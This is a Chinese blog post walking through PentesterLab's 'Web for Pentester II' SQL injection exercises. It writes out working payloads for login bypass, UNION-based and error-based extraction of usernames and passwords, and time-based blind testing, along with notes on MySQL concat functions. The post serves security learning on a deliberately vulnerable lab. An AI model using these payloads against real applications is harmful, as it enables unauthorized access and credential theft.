<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PentesterLab刷题记录 | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>PentesterLab刷题记录</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-12-14T08:28:13.391Z" id="date"> 2023-12-14</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-12-18T09:12:12.400Z" id="updated"> 2023-12-18</time></div></span><br><span>文章总字数: <div class="control">16.8k</div></span><br><span>预计阅读时间: <div class="control">66 分钟</div></span></div></div><hr><div id="post-content"><h1>0x01 搭建</h1>
<p>文件下载地址：<a target="_blank" rel="noopener" href="https://pentesterlab.com/exercises/web_for_pentester_II/attachments">https://pentesterlab.com/exercises/web_for_pentester_II/attachments</a></p>
<p>下载之后新建虚拟机直接导入iso文件，之后一路默认下一步即可，开启虚拟机后ifconfig查看ip直接访问就行，如果访问不了，则换成桥接模式。</p>
<p class='item-img' data-src='image-20231214163115262.png'><img src="image-20231214163115262.png" alt="image-20231214163115262"></p>
<p>搭建成功的结果：</p>
<p class='item-img' data-src='image-20231214163128244.png'><img src="image-20231214163128244.png" alt="image-20231214163128244"></p>
<p>官方说明：</p>
<p>如果您还没有这样做，请务必查看我们的第一个练习：Web For Pentester。在开始这一项之前，先从它开始，这一点很重要。</p>
<p>如果您感觉真的很舒服，您可以尝试利用这些漏洞，而无需遵循课程。您只需要能够编写小脚本来发送 HTTP 请求，这样您就可以完成所有这些练习</p>
<h1>0x02 SQL注入</h1>
<p>官方说明：</p>
<p>本节提供了一些常见的 SQL 注入示例，第一个示例是身份验证绕过，其他示例是更传统的 SQL 注入。</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example-1"></a>Example 1</h2>
<p class='item-img' data-src='image-20231214163508225.png'><img src="image-20231214163508225.png" alt="image-20231214163508225"></p>
<p>首页是一个post的传参，我们先测试一下</p>
<p class='item-img' data-src='image-20231214163539569.png'><img src="image-20231214163539569.png" alt="image-20231214163539569"></p>
<p>这里输入1’发现报错，直接显示了查询语句。。。，那我们根据sql语句构造万能密码即可。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">AND</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span><br></code></pre></td></tr></table></figure>
<p>构造原因为在sql语法中and优先级高于or，那上述sql语句在处理的时候会先判断<code>username='' AND password='1'</code>很明显为false，接着在判断</p>
<p><code>username='' AND password='1' or '1'='1'</code>即<code>false or '1'='1' </code> = <code>false or true</code> = <code>true</code>为真。</p>
<p>也就是说如果我们将password赋值为<code>1' or '1'='1</code>将成功绕过，如下图也成功验证。</p>
<p class='item-img' data-src='image-20231214164345354.png'><img src="image-20231214164345354.png" alt="image-20231214164345354"></p>
<p>当然我们也可以利用注释符：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">令username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27; or 1=1#则不需要输入password</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231214164616200.png'><img src="image-20231214164616200.png" alt="image-20231214164616200"></p>
<p>附上几个其他师傅的姿势，万变不离其宗</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">&quot;or&quot;<span class="hljs-operator">=</span>&quot;a&#x27;=&#x27;a<br><br>a&#x27;or&#x27; 1=1--<br><br>&#x27;or&#x27;&#x27;=&#x27;<br></code></pre></td></tr></table></figure>
<h2 id="Example-2"><a href="#Example-2" class="headerlink" title="Example-2"></a>Example 2</h2>
<p class='item-img' data-src='image-20231214165457163.png'><img src="image-20231214165457163.png" alt="image-20231214165457163"></p>
<p>依旧是简单测试，虽然语句与上关一样，但万能密码无效了。于是看了几个wp虽然知道如何通过，但原理有点不清楚。这里有的师傅直接联合注入查询就行了，还有一个是限制了查询结果数，payload如下：</p>
<h3 id="姿势一："><a href="#姿势一：" class="headerlink" title="姿势一："></a>姿势一：</h3>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27; or 1=1 limit 1#</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231214170637462.png'><img src="image-20231214170637462.png" alt="image-20231214170637462"></p>
<p class='item-img' data-src='image-20231214170642465.png'><img src="image-20231214170642465.png" alt="image-20231214170642465"></p>
<p>或者：</p>
<h3 id="姿势二："><a href="#姿势二：" class="headerlink" title="姿势二："></a>姿势二：</h3>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3#</span><br><span class="hljs-string">接着</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231214171146583.png'><img src="image-20231214171146583.png" alt="image-20231214171146583"></p>
<p class='item-img' data-src='image-20231214171158535.png'><img src="image-20231214171158535.png" alt="image-20231214171158535"></p>
<p>这里万能密码无效的原因可能是后台源码只允许查询出一条数据，但如果你使用万能秘密，他是恒真的语句，一定会查询出所有数据的，这里就会有冲突。</p>
<h2 id="Example-3"><a href="#Example-3" class="headerlink" title="Example-3"></a>Example 3</h2>
<p class='item-img' data-src='image-20231214171407743.png'><img src="image-20231214171407743.png" alt="image-20231214171407743"></p>
<p>这里输入1’无法报错了，接着输入1\成功报错，这里也是懵逼，看了wp才想到单引号被过滤了。这里还是太菜了，不知道如何构造了，学习一下师傅们的姿势</p>
<h3 id="姿势一"><a href="#姿势一" class="headerlink" title="姿势一"></a>姿势一</h3>
<p>尝试去构造及规避：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>\<br>password<span class="hljs-operator">=</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#<br>这样的话:<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;\&#x27;</span> <span class="hljs-keyword">AND</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;or 1=1#&#x27;</span><br>相当于:<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span>(<span class="hljs-string">&#x27;\&#x27;</span> <span class="hljs-keyword">AND</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;) or 1=1    #这里括号起提示作用</span><br><span class="hljs-string">即:</span><br><span class="hljs-string">构造username=&#x27;</span>x<span class="hljs-string">&#x27; or 1=1 而后面的内容被#注释了,因此我们成功使该sql为真</span><br></code></pre></td></tr></table></figure>
<p>实践一下，成功绕过。</p>
<p class='item-img' data-src='image-20231214172221390.png'><img src="image-20231214172221390.png" alt="image-20231214172221390"></p>
<h3 id="姿势二：-2"><a href="#姿势二：-2" class="headerlink" title="姿势二：-2"></a>姿势二：</h3>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>\<span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-operator">||</span><span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure>
<p>这里与上述姿势一差不多，只不过将or替换为了||。这样的话可以如下变形</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>\<span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-operator">||</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#<br>username<span class="hljs-operator">=</span>\<span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure>
<h2 id="Example-4"><a href="#Example-4" class="headerlink" title="Example-4"></a>Example 4</h2>
<p class='item-img' data-src='image-20231214173000040.png'><img src="image-20231214173000040.png" alt="image-20231214173000040"></p>
<p>这关到了熟悉的查询环节，这里对username的参数经过测试没有任何过滤，我们常规思路即可，简单步骤这里不赘述了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?req<span class="hljs-operator">=</span>username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;hacker&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> database(),<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231214173056656.png'><img src="image-20231214173056656.png" alt="image-20231214173056656"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?req<span class="hljs-operator">=</span>username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;hacker&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(table_name),<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqlinjection_example4&#x27;</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231214173536242.png'><img src="image-20231214173536242.png" alt="image-20231214173536242"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?req<span class="hljs-operator">=</span>username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;hacker&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(column_name),<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqlinjection_example4&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span><br>或<br>?req<span class="hljs-operator">=</span>username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;hacker&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(column_name),<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231214173947424.png'><img src="image-20231214173947424.png" alt="image-20231214173947424"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?req<span class="hljs-operator">=</span>username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;hacker&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(id,<span class="hljs-string">&#x27;--&gt;&#x27;</span>,password),<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231214174044414.png'><img src="image-20231214174044414.png" alt="image-20231214174044414"></p>
<p>另外既然这关有报错信息，那肯定还可以进行报错注入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?req<span class="hljs-operator">=</span>username <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231214174149598.png'><img src="image-20231214174149598.png" alt="image-20231214174149598"></p>
<p>剩下不在赘述</p>
<h2 id="Example-5"><a href="#Example-5" class="headerlink" title="Example-5"></a>Example 5</h2>
<p class='item-img' data-src='image-20231214174711628.png'><img src="image-20231214174711628.png" alt="image-20231214174711628"></p>
<p>这关简单测试了下发现是对limit的值的查询，虽然测试了上关的payload可以使用，但不知为何报错注入不可，之后继续测试发现使用联合注入可以进行报错。。。。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?limit<span class="hljs-operator">=</span><span class="hljs-number">4</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231214174942807.png'><img src="image-20231214174942807.png" alt="image-20231214174942807"></p>
<p>正常来说这样即可，不过这里不理解的点是order by判断列数不管用，总是报错，估计和sql语法有关。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?limit<span class="hljs-operator">=</span><span class="hljs-number">4</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(id,<span class="hljs-string">&#x27;--&gt;&#x27;</span>,password),<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure>
<p>查询一番发现如下：</p>
<h3 id="LIMIT和ORDER-BY如何组合使用"><a href="#LIMIT和ORDER-BY如何组合使用" class="headerlink" title="LIMIT和ORDER-BY如何组合使用"></a>LIMIT和ORDER BY如何组合使用</h3>
<p>当同时使用LIMIT和ORDER BY时，应该注意它们是如何组合使用的。</p>
<p>LIMIT和ORDER BY的顺序对结果集有影响。如果在LIMIT之前使用ORDER BY语句，则数据库会先对结果集进行排序，然后放回所需的记录。</p>
<p>例如，下面的查询将返回“employee”表中最高工资的前3个员工：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM employee ORDER BY salary DESC LIMIT 3;<br></code></pre></td></tr></table></figure>
<p>如果先使用LIMIT，再使用ORDER BY，数据库会先返回所需记录，然后对它们进行排序。这可能会导致排序结果不正确。</p>
<h2 id="Example-6"><a href="#Example-6" class="headerlink" title="Example-6"></a>Example 6</h2>
<p class='item-img' data-src='image-20231214175641141.png'><img src="image-20231214175641141.png" alt="image-20231214175641141"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">group</span>(可控); <br></code></pre></td></tr></table></figure>
<p>sql语句如上，group by会按照后续的字段也就是group关键词进行分组</p>
<p class='item-img' data-src='image-20231214175749487.png'><img src="image-20231214175749487.png" alt="image-20231214175749487"></p>
<p>如上图，这里依旧同example 4的思路即可，也是没任何过滤</p>
<h2 id="Example-7"><a href="#Example-7" class="headerlink" title="Example-7"></a>Example 7</h2>
<p class='item-img' data-src='image-20231214180025586.png'><img src="image-20231214180025586.png" alt="image-20231214180025586"></p>
<h3 id="姿势一：-2"><a href="#姿势一：-2" class="headerlink" title="姿势一：-2"></a>姿势一：</h3>
<p>如上图，sql语句如下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id(可控)<br></code></pre></td></tr></table></figure>
<p>这里先做了报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span>,updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> group_concat(id,<span class="hljs-string">&#x27;--&gt;&#x27;</span>,password)<span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
<p>如上述语句，不过这里只展示了如下图一条数据，接着我尝试用limit展示下一个，但无果，页面提示只能显示一个用户。。。。我不理解</p>
<p class='item-img' data-src='image-20231214185845345.png'><img src="image-20231214185845345.png" alt="image-20231214185845345"></p>
<p>这里看了别的师傅的姿势，学习一下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),(<span class="hljs-keyword">select</span> concat(<span class="hljs-number">0x5f</span>,database(),<span class="hljs-number">0x5f</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x5f</span>,version())))a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a)b<br>这样也可：<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),(<span class="hljs-keyword">select</span> concat(<span class="hljs-number">0x5f</span>,database(),<span class="hljs-number">0x5f</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x5f</span>,version())))a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a)b<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231214190132840.png'><img src="image-20231214190132840.png" alt="image-20231214190132840"></p>
<p>这里师傅用的是主键重复报错，不过具体原理我记不太清楚了，写完这个系列会去复习一波的。–疑点：为何select后面要跟个1</p>
<p>但这里我尝试接着爆用户名和秘密，但依旧只能有一条数据。接着又去找几篇wp发现还是可以进行报错注入。。。。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span>extractvalue(<span class="hljs-number">0x7e</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> concat(username,<span class="hljs-number">0x7e</span>,password)<span class="hljs-keyword">from</span> users limit <span class="hljs-number">9</span>,<span class="hljs-number">1</span>)))<br>或者<br>?id<span class="hljs-operator">=</span>updatexml(<span class="hljs-number">0x7e</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> concat(username,<span class="hljs-number">0x7e</span>,password)<span class="hljs-keyword">from</span> users limit <span class="hljs-number">9</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">0x7e</span>)<br></code></pre></td></tr></table></figure>
<p>且这种payload只需要控制limit即可爆出所有数据，接着我又分析了一下最开始的payload与上述的不同点</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> group_concat(username,<span class="hljs-string">&#x27;--&gt;&#x27;</span>,password)<span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br>与<br>?id<span class="hljs-operator">=</span>updatexml(<span class="hljs-number">0x7e</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> concat(username,<span class="hljs-number">0x7e</span>,password)<span class="hljs-keyword">from</span> users limit <span class="hljs-number">9</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">0x7e</span>)<br></code></pre></td></tr></table></figure>
<p>很明显就是group_concat的原因了，为此我们了解一下这两个函数的区别</p>
<h3 id="concat-函数"><a href="#concat-函数" class="headerlink" title="concat-函数"></a>concat()函数</h3>
<p>功能：将多个字符串连接成一个字符串。</p>
<p>语法：concat(str1, str2,…)</p>
<p>返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p>
<p>值得注意的是每次只返回的是一行的数据。–这里的测试就直接拿现成的图了，懒得去手工了。</p>
<p>这里借用sqli-labs的users表演示，我们先看看users表的结构以及都有哪些数据。</p>
<p class='item-img' data-src='image-20231214193923651.png'><img src="image-20231214193923651.png" alt="image-20231214193923651"></p>
<p>可以看到users表中有三个字段，分别为id、username、password。然后一共有13条数据。</p>
<p>使用concat()函数演示一下</p>
<p class='item-img' data-src='image-20231214193935990.png'><img src="image-20231214193935990.png" alt="image-20231214193935990"></p>
<p>可以看到concat()将每一次查询的id和username的值连接到一起形成一个字符串返回了，并且一共返回的是13条记录，但是注意当concat()中有一个参数是null时，返回的都是null</p>
<h3 id="group-concat-函数"><a href="#group-concat-函数" class="headerlink" title="group-concat-函数"></a>group_concat()函数</h3>
<p>group_concat()函数是将所有的查询结果拼接成一个字符串返回，不过在不同的字段值之间默认是用逗号隔开的</p>
<p class='item-img' data-src='image-20231214194003502.png'><img src="image-20231214194003502.png" alt="image-20231214194003502"></p>
<p>可以看到返回的值就只有一个值。</p>
<p>像concat()函数那样直接拼接内容，中间没有做隔离，很可能会导致我们无法判断哪些字符是属于哪一个字段的。而group_concat()函数默认是用逗号隔开两行不同查询结果的。当然也支持自己定义隔离的符号。</p>
<h3 id="concat-ws-函数"><a href="#concat-ws-函数" class="headerlink" title="concat-ws-函数"></a>concat_ws()函数</h3>
<p>功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符（concat_ws就是concat with separator）</p>
<p>语法：concat_ws(separator, str1, str2, …)</p>
<p>说明：第一个参数就是指定的分隔符。需要注意的是分隔符不能为null，如果为null，则返回结果为null（其他参数哪一个为null也是一样的）。</p>
<p class='item-img' data-src='image-20231214194041591.png'><img src="image-20231214194041591.png" alt="image-20231214194041591"></p>
<p>接下来是这位师傅自己的见解：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">在sql注入中，我们要分情况的来使用这三个函数。<br><br>一般在注入中因为回显的位置有限，我们就会使用concat函数把不同的字段连起来，但是concat()函数一次返回的只是一行的数据，所以还需要结合limit一起使用，一个一个的遍历查看。<br><br>但是遍历查看未免太过于麻烦，这个时候group_concat()函数就体现出优势了。因为它可以把所有的查询结果集中到一起返回。这里值得注意的一点就是group_concat()函数对于返回的字符串长度是有限制的。使用<br><br>show variables like &#x27;group_concat_max_len&#x27;<br><br>查看系统变量对返回字符串的长度限制，一般都是1024个字符长度。<br></code></pre></td></tr></table></figure>
<p>文章地址：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42721957/article/details/105144686">group_concat()与concat()以及concat_ws()之间的区别</a></p>
<p>有了这三个函数的解释我们可以清楚的知道上述我最开始使用的payload的错误，因为group_concat函数最终返回的结果只有一行，而此时我还妄想着limit去显示其他行（但实际就一行）这肯定是荒谬的。故此时我们就需要利用left，substring等函数去将那一行长数据进行回显（但无疑在这种方法似乎有点费劲）。</p>
<p>对此如果我们使用cancat函数，那么我们只需要修改limit即可找到所有数据。</p>
<h3 id="姿势二：-3"><a href="#姿势二：-3" class="headerlink" title="姿势二：-3"></a>姿势二：</h3>
<p>其他师傅呢还使用了盲注，我们先简单测试一下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> if(length(database())<span class="hljs-operator">=</span><span class="hljs-number">21</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>接着我们根据页面回显就能判断出，database为21个字符，接着我们可以尝试写脚本或者sqlmap跑，这里我就用sqlmap了，毕竟脚本我不会写（大菜鸡）。。。。</p>
<p class='item-img' data-src='image-20231214200520208.png'><img src="image-20231214200520208.png" alt="image-20231214200520208"></p>
<p>赋个源码：咱也不知道师傅们咋找到源码的。。。。</p>
